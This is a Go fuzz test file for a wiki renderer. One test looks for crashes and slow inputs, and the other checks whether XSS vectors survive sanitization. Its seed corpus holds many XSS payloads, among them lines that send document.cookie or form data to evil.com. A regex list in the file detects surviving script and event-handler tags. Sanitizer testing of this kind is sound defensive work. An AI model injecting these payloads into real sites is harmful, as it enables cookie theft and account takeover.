package render_test

import (
	"regexp"
	"strings"
	"testing"
	"time"

	"github.com/danielledeleo/periwiki/testutil"
)

// FuzzRenderCrash finds panics, crashes, and pathologically slow inputs.
func FuzzRenderCrash(f *testing.F) {
	// Seed corpus - organized by category for maintainability
	seeds := []string{
		// ============================================================
		// BASIC MARKDOWN
		// ============================================================
		"# Heading\n\nParagraph text.",
		"## Section\n\n### Subsection\n\n#### Deep",
		"- item 1\n- item 2\n- item 3",
		"1. first\n2. second\n3. third",
		"**bold** and *italic* and `code`",
		"```\ncode block\n```",
		"```go\nfunc main() {}\n```",
		"> blockquote\n> continued",
		"---", // horizontal rule (not frontmatter - no newline)
		"***",
		"___",

		// ============================================================
		// WIKILINKS - Basic
		// ============================================================
		"[[Simple Link]]",
		"[[Page|Display Text]]",
		"[[Page#anchor]]",
		"[[Page#anchor|Display]]",
		"Check [[This]] and [[That|other]].",

		// WikiLinks - Whitespace handling (regex uses \s*)
		"[[ Spaced ]]",
		"[[  Multi  Space  ]]",
		"[[\tTabbed\t]]",
		"[[\nNewline\n]]",
		"[[Page | Spaced Pipe]]",
		"[[Page  |  Double Spaced]]",
		"[[ Leading|Trailing ]]",

		// WikiLinks - Escaped pipe (regex has \\\|)
		`[[Page\|With\|Escaped\|Pipes]]`,
		`[[Page\||Display]]`,
		`[[\|StartsWithPipe]]`,

		// WikiLinks - Bracket edge cases (regex excludes [])
		"[[[Triple]]]",
		"[[Outer[[Inner]]Outer]]",
		"[[Page]Extra]",
		"[[Page[Bracket]]]",
		"[Single]",
		"[ [Spaced] ]",

		// WikiLinks - Empty/minimal
		"[[]]",
		"[[|]]",
		"[[ ]]",
		"[[  |  ]]",
		"[[\t|\t]]",

		// WikiLinks - Long content
		"[[" + strings.Repeat("a", 1000) + "]]",
		"[[Page|" + strings.Repeat("b", 1000) + "]]",
		"[[" + strings.Repeat("Long", 100) + "|" + strings.Repeat("Display", 100) + "]]",

		// WikiLinks - Special characters
		"[[Page/With/Slashes]]",
		"[[Page?query=value]]",
		"[[Page&ampersand]]",
		"[[Page%20Encoded]]",
		"[[Page#anchor#double]]",
		"[[Page|Display#WithHash]]",
		`[[Page"Quotes"]]`,
		"[[Page'Apostrophe']]",
		"[[Page<Angle>Brackets]]",
		"[[Page\\Backslash]]",

		// WikiLinks - Unicode
		"[[日本語ページ]]",
		"[[Page|显示文本]]",
		"[[Ελληνικά]]",
		"[[العربية]]",
		"[[🎉Emoji🎉]]",
		"[[Page|🔗]]",
		"[[café]]",
		"[[naïve]]",
		"[[zero\u200Bwidth]]",     // zero-width space
		"[[Page\u202Ereverse]]",   // RTL override
		"[[Page\uFEFFbom]]",       // BOM character
		"[[combining\u0301char]]", // combining acute accent

		// ============================================================
		// FOOTNOTES - Basic
		// ============================================================
		"Text with footnote[^1].\n\n[^1]: The footnote content.",
		"Multiple[^a] footnotes[^b] here.\n\n[^a]: First.\n[^b]: Second.",
		"Named[^note] reference.\n\n[^note]: Named footnote.",

		// Footnotes - Edge cases
		"[^]",
		"[^]: Empty name",
		"[^ ]: Spaced name",
		"Reference[^missing] without definition.",
		"[^orphan]: Definition without reference.",
		"[^1]:\n\n[^1]: Duplicate definition.",
		"[^1][^1]: Double reference.\n\n[^1]: One def.",
		"[^" + strings.Repeat("x", 100) + "]: Long name.\n\nRef[^" + strings.Repeat("x", 100) + "].",

		// Footnotes - Special characters in IDs
		"[^with-dash]: Content\n\nRef[^with-dash]",
		"[^with_underscore]: Content\n\nRef[^with_underscore]",
		"[^123]: Numeric\n\nRef[^123]",
		"[^MixedCase]: Case\n\nRef[^MixedCase]",
		"[^日本語]: Unicode ID\n\nRef[^日本語]",

		// Footnotes - Complex content
		"[^complex]: Content with **bold** and *italic*.\n\nRef[^complex]",
		"[^wikilink]: Content with [[Link]].\n\nRef[^wikilink]",
		"[^nested]: Content[^other] with nested ref.\n\n[^other]: Other.\n\nRef[^nested]",
		"[^multi]: Line one.\n    Line two indented.\n    Line three.\n\nRef[^multi]",

		// ============================================================
		// TABLES
		// ============================================================
		"| A | B |\n|---|---|\n| 1 | 2 |",
		"| A | B | C |\n|:--|:--:|--:|\n| L | C | R |", // alignment
		"|A|B|\n|-|-|\n|1|2|",                         // minimal spacing
		"| | |\n|---|---|\n| | |",                     // empty cells
		"| [[Link]] | [^note] |\n|---|---|\n| x | y |\n\n[^note]: Note.",
		"| " + strings.Repeat("Wide", 50) + " |\n|---|\n| x |",
		"|A|\n|-|\n" + strings.Repeat("|x|\n", 100), // many rows
		"| Pipe \\| Escaped |\n|---|\n| x |",
		"| `code` | **bold** |\n|---|---|\n| x | y |",

		// ============================================================
		// FRONTMATTER - Basic
		// ============================================================
		"---\ndisplay_title: Custom Title\n---\n# Hello",
		"---\ndisplay_title: Title\nunknown: value\n---\nContent",
		"---\n---\n# Empty frontmatter",

		// Frontmatter - Line ending variations
		"---\r\ndisplay_title: CRLF\r\n---\r\n# Test",
		"---\ndisplay_title: LF\n---\n# Test",
		"---\r\ndisplay_title: Mixed\n---\r\n# Test",

		// Frontmatter - Edge cases with delimiters
		"---\n---",                    // empty, no content after
		"---\n---\n",                  // empty with trailing newline
		"---\n---# No newline after",  // no newline after closing
		"---\ndisplay_title: x\n---",  // no content after
		"----\ndisplay_title: x\n---", // extra dash (not frontmatter)
		"---\ndisplay_title: x\n----", // extra dash in closing
		" ---\ndisplay_title: x\n---", // leading space (not frontmatter)
		"---\ndisplay_title: x\n--- ", // trailing space after close

		// Frontmatter - Not at document start
		"\n---\ndisplay_title: x\n---",        // newline before
		" \n---\ndisplay_title: x\n---",       // space+newline before
		"# Title\n---\ndisplay_title: x\n---", // content before

		// Frontmatter - Values with special content
		"---\ndisplay_title: [[WikiLink]]\n---\n# Test",
		"---\ndisplay_title: [^footnote]\n---\n# Test",
		"---\ndisplay_title: | pipe\n---\n# Test",
		"---\ndisplay_title: {{.Secret}}\n---\n# Test",
		"---\ndisplay_title: ${variable}\n---\n# Test",
		"---\ndisplay_title: %s format\n---\n# Test",
		"---\ndisplay_title: <script>xss</script>\n---\n# Test",
		"---\ndisplay_title: \"quoted\"\n---\n# Test",
		"---\ndisplay_title: 'single quoted'\n---\n# Test",
		"---\ndisplay_title: back`tick\n---\n# Test",
		"---\ndisplay_title: " + strings.Repeat("long", 200) + "\n---\n# Test",

		// Frontmatter - Unicode
		"---\ndisplay_title: 日本語タイトル\n---\n# Test",
		"---\ndisplay_title: Ümlauts äöü\n---\n# Test",
		"---\ndisplay_title: Emoji 🎉🚀\n---\n# Test",

		// Frontmatter - Multiple fields
		"---\ndisplay_title: Title\nfield2: value2\nfield3: value3\n---\n# Test",
		"---\na: 1\nb: 2\nc: 3\nd: 4\ne: 5\n---\n# Test",

		// ============================================================
		// HEADINGS - TOC generation
		// ============================================================
		"## A\n### B\n#### C\n#### D\n### E\n## F",
		"## " + strings.Repeat("Long", 50) + "\n\nContent",
		"## <em>Formatted</em> Heading",
		"## [[WikiLink]] in Heading",
		"## Heading [^note]\n\n[^note]: Note.",
		"## Heading with `code`",
		"## Duplicate\n\n## Duplicate\n\n## Duplicate",
		strings.Repeat("## H\n\n", 100), // many headings
		"## #HashInHeading",
		"##NoSpace",
		"## \n\nEmpty heading",

		// ============================================================
		// MIXED CONTENT - Combinations
		// ============================================================
		"## Section\n\n[[Link]] and [^note]\n\n[^note]: Note with [[Another Link]].",
		"---\ndisplay_title: Mixed\n---\n## Heading\n\n| [[Link]] | [^n] |\n|---|---|\n| x | y |\n\n[^n]: Note.",
		"[[Link|With [^footnote] inside]]\n\n[^footnote]: Note.",
		"> Blockquote with [[Link]] and [^note]\n\n[^note]: Note.",
		"- List with [[Link]]\n- And [^note]\n\n[^note]: Note.",
		"```\n[[Not a link]]\n```",
		"`[[Inline code]]`",

		// ============================================================
		// PATHOLOGICAL - Regex stress tests
		// ============================================================
		// WikiLink regex backtracking
		strings.Repeat("[[", 50) + strings.Repeat("]]", 50),
		strings.Repeat("[", 100) + strings.Repeat("]", 100),
		strings.Repeat("[[a", 30) + strings.Repeat("]]", 30),
		"[[" + strings.Repeat("a|", 50) + "b]]",
		"[[" + strings.Repeat("|", 50) + "]]",

		// Footnote stress
		strings.Repeat("[^n]", 100) + "\n\n[^n]: Note.",
		strings.Repeat("[^", 50) + strings.Repeat("]", 50),

		// Frontmatter regex
		"---\n" + strings.Repeat("x: y\n", 100) + "---\n# Test",
		"---\ndisplay_title: " + strings.Repeat("-", 100) + "\n---\n# Test",

		// Deep nesting
		strings.Repeat("> ", 50) + "Deep quote",
		strings.Repeat("- ", 30) + "Deep list",
		strings.Repeat("  ", 50) + "Deep indent",

		// Large inputs
		strings.Repeat("a", 10000),
		strings.Repeat("[[Link]] ", 500),
		strings.Repeat("[^n] ", 500) + "\n\n[^n]: Note.",
		strings.Repeat("| a ", 100) + "|\n" + strings.Repeat("|---", 100) + "|\n",

		// ============================================================
		// HTML/XSS - Sanitization stress
		// ============================================================
		"<div>[[Link inside div]]</div>",
		"<script>alert('xss')</script>",
		"<img src=x onerror=alert(1)>",
		"<a href=\"javascript:alert(1)\">click</a>",
		"<svg/onload=alert(1)>",
		"<math><mi href=\"javascript:alert(1)\">x</mi></math>",
		"<<script>script>alert(1)<</script>/script>",
		"<scr<script>ipt>alert(1)</scr</script>ipt>",
		"<img src=\"x\" onerror=\"alert(1)\" />",
		"<body onload=alert(1)>",
		"<iframe src=\"javascript:alert(1)\">",
		"<object data=\"javascript:alert(1)\">",
		"<embed src=\"javascript:alert(1)\">",
		"<a href=\"data:text/html,<script>alert(1)</script>\">click</a>",
		"<a href=\"vbscript:alert(1)\">click</a>",
		"<div style=\"background:url(javascript:alert(1))\">",
		"<input onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<video><source onerror=alert(1)>",
		"<audio src=x onerror=alert(1)>",
		"<details open ontoggle=alert(1)>",
		"<math><maction actiontype=\"statusline#http://google.com\" xlink:href=\"javascript:alert(1)\">click</maction></math>",

		// Encoding tricks
		"<scr\x00ipt>alert(1)</script>",
		"<script>alert(1)</script>",
		"&#60;script&#62;alert(1)&#60;/script&#62;",
		"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
		"\u003cscript\u003ealert(1)\u003c/script\u003e",

		// ============================================================
		// EMPTY/MINIMAL
		// ============================================================
		"",
		"\n",
		"\n\n\n",
		" ",
		"\t",
		"\r\n",
		"\x00", // null byte
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	// Use production-equivalent setup via testutil
	app, cleanup := testutil.SetupTestApp(f)
	defer cleanup()

	f.Fuzz(func(t *testing.T, input string) {
		start := time.Now()

		// This should not panic - uses full render+sanitize pipeline
		_, _ = app.Rendering.Render(input)

		elapsed := time.Since(start)
		if elapsed > 100*time.Millisecond {
			t.Fatalf("pathological input: render took %v (>100ms)\ninput length: %d\ninput prefix: %q",
				elapsed, len(input), truncate(input, 200))
		}
	})
}

// FuzzRenderXSS tests if dangerous content survives the full render+sanitize pipeline.
func FuzzRenderXSS(f *testing.F) {
	// Seed with XSS-focused inputs - organized by attack vector
	seeds := []string{
		// ============================================================
		// SCRIPT TAGS - Direct injection
		// ============================================================
		"<script>alert('xss')</script>",
		"<SCRIPT>alert(1)</SCRIPT>",
		"<ScRiPt>alert(1)</ScRiPt>",
		"<script src=http://evil.com/x.js></script>",
		"<script>alert(String.fromCharCode(88,83,83))</script>",
		"<script>alert`xss`</script>",                               // template literal
		"<script>alert(document.cookie)</script>",
		"<script>location='http://evil.com/?c='+document.cookie</script>",
		"<script/src=http://evil.com/x.js>",                         // missing space
		"<script\tsrc=http://evil.com/x.js>",                        // tab instead of space
		"<script\nsrc=http://evil.com/x.js>",                        // newline
		"<script >alert(1)</script>",                                // trailing space
		"<script	>alert(1)</script>",                               // trailing tab
		"<script/>alert(1)",                                         // self-closing attempt

		// Script in WikiLinks
		"[[<script>alert(1)</script>]]",
		"[[page|<script>alert(1)</script>]]",
		"[[<script>]]",
		"[[page|x<script>alert(1)</script>y]]",

		// Script in footnotes
		"[^xss]: <script>alert(1)</script>\n\nRef[^xss]",
		"[^<script>alert(1)</script>]: note\n\nRef[^<script>alert(1)</script>]",

		// Script in frontmatter
		"---\ndisplay_title: <script>alert(1)</script>\n---\n# Test",
		"---\nfield: <script>alert(1)</script>\n---\n# Test",

		// Script in tables
		"| <script>alert(1)</script> | test |\n|---|---|\n| x | y |",
		"| header |\n|---|\n| <script>alert(1)</script> |",

		// Script in headings
		"## <script>alert(1)</script>\n\nText",
		"## Title<script>alert(1)</script>",

		// ============================================================
		// EVENT HANDLERS - on* attributes
		// ============================================================
		"<img src=x onerror=alert(1)>",
		"<img src=x onerror='alert(1)'>",
		`<img src=x onerror="alert(1)">`,
		"<img/src=x onerror=alert(1)>",
		"<img src=x OnError=alert(1)>",
		"<img src=x onerror =alert(1)>",
		"<img src=x onerror= alert(1)>",
		"<img src=x onerror\t=\talert(1)>",
		"<img src=x onerror\n=\nalert(1)>",

		"<body onload=alert(1)>",
		"<body onpageshow=alert(1)>",
		"<input onfocus=alert(1) autofocus>",
		"<input onblur=alert(1) autofocus>",
		"<select onfocus=alert(1) autofocus>",
		"<textarea onfocus=alert(1) autofocus>",
		"<marquee onstart=alert(1)>",
		"<marquee onfinish=alert(1)>",
		"<video onerror=alert(1)><source src=x>",
		"<video><source onerror=alert(1) src=x>",
		"<audio onerror=alert(1) src=x>",
		"<details open ontoggle=alert(1)>",
		"<div onmouseover=alert(1)>hover</div>",
		"<div onmouseenter=alert(1)>hover</div>",
		"<div onclick=alert(1)>click</div>",
		"<div ondblclick=alert(1)>double click</div>",
		"<div oncontextmenu=alert(1)>right click</div>",
		"<svg onload=alert(1)>",
		"<svg/onload=alert(1)>",
		"<math href=\"javascript:alert(1)\">",
		"<a onmouseover=alert(1)>hover</a>",
		"<form onsubmit=alert(1)>",
		"<button onclick=alert(1)>",
		"<keygen onfocus=alert(1) autofocus>",
		"<isindex onfocus=alert(1) autofocus>",

		// Event handlers in WikiLinks
		"[[<img src=x onerror=alert(1)>]]",
		"[[\" onclick=\"alert(1)]]",
		"[[page\" onclick=\"alert(1)|text]]",
		"[[page#\" onclick=\"alert(1)]]",
		"[[ onmouseover=alert(1) x]]",
		"[[page|<div onclick=alert(1)>click</div>]]",

		// ============================================================
		// JAVASCRIPT PROTOCOL
		// ============================================================
		"<a href=\"javascript:alert(1)\">click</a>",
		"<a href='javascript:alert(1)'>click</a>",
		"<a href=javascript:alert(1)>click</a>",
		"<a href=\"JavaScript:alert(1)\">click</a>",
		"<a href=\"java\nscript:alert(1)\">click</a>",
		"<a href=\"java\tscript:alert(1)\">click</a>",
		"<a href=\"java\rscript:alert(1)\">click</a>",
		"<a href=\" javascript:alert(1)\">click</a>",
		"<a href=\"  javascript:alert(1)\">click</a>",
		"<a href=\"\tjavascript:alert(1)\">click</a>",
		"<a href=\"&#106;avascript:alert(1)\">click</a>",
		"<a href=\"&#x6A;avascript:alert(1)\">click</a>",
		"<a href=\"\\x6Aavascript:alert(1)\">click</a>",

		// In WikiLinks
		"[[javascript:alert(1)]]",
		"[[javascript:alert(1)|click me]]",
		"[[JavaScript:alert(1)]]",
		"[[java\nscript:alert(1)]]",
		"[[ javascript:alert(1)]]",

		// In other attributes
		"<iframe src=\"javascript:alert(1)\">",
		"<object data=\"javascript:alert(1)\">",
		"<embed src=\"javascript:alert(1)\">",
		"<form action=\"javascript:alert(1)\">",
		"<input formaction=\"javascript:alert(1)\">",
		"<button formaction=\"javascript:alert(1)\">",
		"<base href=\"javascript:alert(1)\">",
		"<applet code=\"javascript:alert(1)\">",

		// ============================================================
		// DATA URLs
		// ============================================================
		"<a href=\"data:text/html,<script>alert(1)</script>\">click</a>",
		"<a href=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">click</a>",
		"<object data=\"data:text/html,<script>alert(1)</script>\">",
		"<iframe src=\"data:text/html,<script>alert(1)</script>\">",
		"<embed src=\"data:text/html,<script>alert(1)</script>\">",

		// ============================================================
		// VBScript (IE)
		// ============================================================
		"<a href=\"vbscript:alert(1)\">click</a>",
		"<img src=x onerror=\"vbscript:alert(1)\">",

		// ============================================================
		// STYLE-BASED XSS
		// ============================================================
		"<div style=\"background:url(javascript:alert(1))\">",
		"<div style=\"background:url('javascript:alert(1)')\">",
		"<div style=\"width:expression(alert(1))\">",
		"<div style=\"-moz-binding:url(http://evil.com/xss.xml#xss)\">",
		"<style>*{background:url(javascript:alert(1))}</style>",
		"<link rel=stylesheet href=\"javascript:alert(1)\">",

		// ============================================================
		// DANGEROUS ELEMENTS
		// ============================================================
		"<iframe src=\"http://evil.com\">",
		"<iframe src=\"//evil.com\">",
		"<iframe srcdoc=\"<script>alert(1)</script>\">",
		"<object data=\"http://evil.com\">",
		"<object type=\"text/html\" data=\"http://evil.com\">",
		"<embed src=\"http://evil.com\" type=\"application/x-shockwave-flash\">",
		"<applet code=\"Evil.class\">",
		"<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
		"<meta http-equiv=\"refresh\" content=\"0;url=http://evil.com\">",
		"<base href=\"http://evil.com\">",
		"<form action=\"http://evil.com\"><input name=data></form>",

		// ============================================================
		// ENCODING BYPASSES
		// ============================================================
		// Null bytes
		"<scr\x00ipt>alert(1)</script>",
		"<img src=x on\x00error=alert(1)>",
		"<a hr\x00ef=\"javascript:alert(1)\">click</a>",

		// HTML entities
		"&#60;script&#62;alert(1)&#60;/script&#62;",
		"&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
		"&lt;script&gt;alert(1)&lt;/script&gt;",
		"&#0000060;script&#0000062;alert(1)&#0000060;/script&#0000062;",

		// Unicode escapes
		"\u003cscript\u003ealert(1)\u003c/script\u003e",
		"<\u0073cript>alert(1)</script>",
		"<script>alert(1)</\u0073cript>",

		// Mixed case
		"<sCrIpT>alert(1)</ScRiPt>",
		"<iMg SrC=x OnErRoR=alert(1)>",

		// Malformed tags
		"<<script>script>alert(1)<</script>/script>",
		"<scr<script>ipt>alert(1)</scr</script>ipt>",
		"<script<script>>alert(1)</script</script>>",
		"<img src=x onerror=alert(1)//",
		"<img src=x onerror=alert(1) ",
		"<img src=x onerror=alert(1)\n",
		"<img src=x onerror=alert(1)\t",

		// ============================================================
		// TEMPLATE INJECTION (Go templates)
		// ============================================================
		"---\ndisplay_title: {{.Secret}}\n---\n# Test",
		"---\ndisplay_title: {{template \"x\"}}\n---\n# Test",
		"---\ndisplay_title: {{define \"x\"}}evil{{end}}\n---\n# Test",
		"---\ndisplay_title: {{printf \"%s\" .}}\n---\n# Test",
		"---\ndisplay_title: {{.Env}}\n---\n# Test",
		"{{.}}",
		"{{template \"base\"}}",
		"[[{{.Secret}}]]",
		"[^{{.}}]: Note\n\nRef[^{{.}}]",

		// ============================================================
		// ATTRIBUTE INJECTION via WikiLink contexts
		// ============================================================
		// href attribute breakout
		"[[page\" onmouseover=\"alert(1)\" data-x=\"]]",
		"[[page' onmouseover='alert(1)' data-x=']]",
		"[[page><script>alert(1)</script><a href=\"]]",
		"[[\"><script>alert(1)</script>]]",
		"[[page|text\" onclick=\"alert(1)\" x=\"]]",

		// title attribute breakout (from OriginalDest)
		"[[page\" onmouseover=\"alert(1)|display]]",

		// class attribute injection
		"[[page|text]] <script>alert(1)</script>",

		// Anchor injection
		"[[page#\" onclick=\"alert(1)]]",
		"[[page#anchor\" onclick=\"alert(1)|text]]",
		"[[page#\"><script>alert(1)</script>]]",

		// ============================================================
		// FOOTNOTE CONTEXT ATTACKS
		// ============================================================
		"[^<script>alert(1)</script>]: Note\n\nRef[^<script>alert(1)</script>]",
		"[^x]: <script>alert(1)</script>\n\nText[^x]",
		"[^x]: <img src=x onerror=alert(1)>\n\nText[^x]",
		"Text[^<script>]",
		"[^\"><script>alert(1)</script>]: Note\n\nRef[^\"><script>alert(1)</script>]",

		// ============================================================
		// HEADING ID INJECTION
		// ============================================================
		"## foo\" onclick=\"alert(1)\n\n## Safe\n",
		"## foo<script>alert(1)</script>\n\n## Safe\n",
		"## </h2><script>alert(1)</script>\n\n## Safe\n",
		"## foo' onfocus='alert(1)\n\n## Safe\n",
		"## <img src=x onerror=alert(1)>\n\n## Safe\n",
		"## foo\"><img src=x onerror=alert(1)>\n\n## Safe\n",

		// ============================================================
		// COMBINED/COMPLEX PAYLOADS
		// ============================================================
		"[[page|<script>alert(1)</script>]] and [^x]\n\n[^x]: <img onerror=alert(2)>",
		"---\ndisplay_title: <script>alert(1)</script>\n---\n[[<img onerror=alert(2)>]]\n[^x]: <svg onload=alert(3)>\n\nRef[^x]",
		"| [[<script>]] | [^x] |\n|---|---|\n| <img onerror=alert(1)> | y |\n\n[^x]: <svg onload=alert(2)>",
	}

	for _, seed := range seeds {
		f.Add(seed)
	}

	// Use production-equivalent setup via testutil
	app, cleanup := testutil.SetupTestApp(f)
	defer cleanup()

	// Dangerous patterns that should never survive sanitization.
	// We use regexes to match actual HTML elements, not escaped content like &lt;script&gt;.
	// All patterns require being inside an actual HTML tag (starting with <).
	dangerousPatterns := []*regexp.Regexp{
		// Script tags
		regexp.MustCompile(`(?i)<script[\s>]`),
		regexp.MustCompile(`(?i)</script>`),
		// Dangerous elements
		regexp.MustCompile(`(?i)<iframe[\s>]`),
		regexp.MustCompile(`(?i)<object[\s>]`),
		regexp.MustCompile(`(?i)<embed[\s>]`),
		regexp.MustCompile(`(?i)<meta[\s>]`),
		regexp.MustCompile(`(?i)<base[\s>]`),
		regexp.MustCompile(`(?i)<form[\s>]`),
		regexp.MustCompile(`(?i)<style[\s>]`),
		regexp.MustCompile(`(?i)<link[\s>]`),
		regexp.MustCompile(`(?i)<svg[\s>]`),
		// Event handlers in actual tags (< followed by tag content with on*=)
		regexp.MustCompile(`(?i)<[^>]+\son\w+\s*=`),
		// JavaScript protocol in href/src attributes (must be inside a tag)
		regexp.MustCompile(`(?i)<[^>]+(href|src)\s*=\s*["']?\s*javascript:`),
	}

	f.Fuzz(func(t *testing.T, input string) {
		rendered, err := app.Rendering.Render(input)
		if err != nil {
			return // Parse errors are expected, not security issues
		}

		for _, pattern := range dangerousPatterns {
			if pattern.MatchString(rendered) {
				t.Fatalf("XSS vector %q survived sanitization!\ninput: %q\nrendered: %q",
					pattern.String(), truncate(input, 200), truncate(rendered, 500))
			}
		}
	})
}

func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	return s[:n] + "..."
}
